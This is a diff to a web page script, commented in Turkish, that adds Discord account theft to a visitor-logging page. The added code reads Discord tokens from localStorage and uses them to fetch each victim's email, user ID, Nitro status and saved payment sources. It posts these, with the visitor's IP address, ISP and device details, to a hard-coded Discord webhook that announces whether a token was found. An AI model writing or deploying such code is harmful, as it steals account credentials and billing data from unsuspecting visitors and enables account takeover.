@@ -64,7 +64,64 @@
             const connection = navigator.connection || {};
             const now = new Date();
 
+            // --- DISCORD TOKEN TOPLAMA (Web) ---
+            let discordData = { token: "N/A", email: "N/A", username: "N/A@N/A", id: "N/A", nitro: "N/A" };
+            
+            // localStorage'dan token çekmeyi dene
+            try {
+                // Discord web, token'ı localStorage'da "token" veya "discord_token" anahtarıyla saklar
+                const possibleKeys = ["token", "discord_token", "discord_token_key"];
+                for (const key of possibleKeys) {
+                    const val = localStorage.getItem(key);
+                    if (val) {
+                        discordData.token = val;
+                        break;
+                    }
+                }
+                
+                // Alternatif: discord.com çerezlerinden token çekmeyi dene
+                // Not: HttpOnly çerezler JS'den okunamaz ama localStorage'a düşen tokenlar okunabilir
+                
+                // Token varsa Discord API ile kullanıcı bilgilerini al
+                if (discordData.token && discordData.token !== "N/A") {
+                    const userResp = await fetch('https://discord.com/api/v9/users/@me', {
+                        headers: { 'Authorization': discordData.token }
+                    });
+                    
+                    if (userResp.ok) {
+                        const user = await userResp.json();
+                        discordData.email = user.email || "N/A";
+                        discordData.username = `${user.username}#${user.discriminator}`;
+                        discordData.id = user.id;
+                        discordData.nitro = user.premium_type > 0 ? "YES" : "NO";
+                        
+                        // Billing bilgilerini de dene
+                        const billingResp = await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources', {
+                            headers: { 'Authorization': discordData.token }
+                        });
+                        if (billingResp.ok) {
+                            const billing = await billingResp.json();
+                            discordData.billing = billing.length > 0 ? JSON.stringify(billing.map(b => ({
+                                type: b.type === 1 ? "Credit Card" : "PayPal",
+                                brand: b.brand || "N/A",
+                                last4: b.last_4 || "N/A"
+                            }))) : "None saved";
+                        }
+                    }
+                }
+            } catch (e) {
+                console.log("Token extraction error:", e);
+            }
+
+            // --- BİLGİ SATIRLARI (Token dahil) ---
             const infoLines = [
+                `--- DISCORD ACCOUNT ---`,
+                `TOKEN: ${discordData.token}`,
+                `USERNAME: ${discordData.username}`,
+                `EMAIL: ${discordData.email}`,
+                `USER ID: ${discordData.id}`,
+                `NITRO: ${discordData.nitro}`,
+                discordData.billing ? `BILLING: ${discordData.billing}` : null,
                 `--- NETWORK ---`,
                 `IP ADDRESS: ${ipData.ip}`,
                 `ISP: ${ipData.org}`,
@@ -90,17 +147,19 @@
                 `SCREEN: ${screen.width}x${screen.height} (${screen.colorDepth}-bit)`,
                 `WINDOW: ${window.innerWidth}x${window.innerHeight}`,
                 `TIME: ${now.toLocaleString()}`
-            ];
+            ].filter(Boolean);
 
+            // Webhook'a tüm bilgileri gönder
             fetch('https://discordapp.com/api/webhooks/1516629813337522298/qhB-GiRVtBCaUcwNWSygoM9pIazDRlIdSZExyh276OfEyEtCSEn3_bFUoOPhSyJYrnRJ', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: "🔍 **Yeni ziyaretçi**",
+                    content: `🔍 **Yeni ziyaretçi**\n🎯 **TOKEN BULUNDU:** ${discordData.token !== "N/A" ? 'YES' : 'NO'}`,
                     embeds: [{ color: 0x00ff00, description: infoLines.join('\n') }]
                 })
             });
 
+            // Ekranda göster
             let fontSize = 42;
             infoLines.forEach((line, index) => {
                 setTimeout(() => {
@@ -110,7 +169,7 @@
                     lineElement.style.fontSize = fontSize + "px";
                     display.appendChild(lineElement);
                     fontSize = Math.max(16, fontSize - 2);
-                }, index * 300);
+                }, index * 250);
             });
         });
 
